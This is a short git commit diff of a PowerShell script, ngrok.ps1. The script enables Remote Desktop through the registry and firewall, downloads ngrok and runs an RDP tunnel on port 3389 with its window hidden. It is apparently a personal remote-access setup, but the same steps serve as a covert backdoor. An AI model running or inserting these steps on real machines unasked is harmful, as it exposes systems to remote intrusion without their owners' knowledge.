0368224ff35e99866392212afe4e1820b02ea128
psychoraze <psychorazed@gmail.com>
2025-05-27 00:59:40 +0500

    2

--- ngrok.ps1
+++ ngrok.ps1
@@ -3,8 +3,8 @@ $ngrokPath = "$env:APPDATA\ngrok"
 $ngrokExe = "$ngrokPath\ngrok.exe"
 $zipPath = "$env:TEMP\ngrok.zip"
 
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null
+Start-Process reg -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb runAs
+netsh advfirewall firewall set rule group="Удаленный рабочий стол" new enable=Yes
 
 if (-Not (Test-Path $ngrokExe)) {
     Invoke-WebRequest -Uri "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -OutFile $zipPath
@@ -15,4 +15,5 @@ if (-Not (Test-Path "$env:USERPROFILE\.ngrok2\ngrok.yml")) {
     & $ngrokExe config add-authtoken $ngrokToken
 }
 
-Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden
+cd $env:USERPROFILE\Downloads
+Start-Process ngrok.exe "tcp 3389" -WindowStyle Hidden
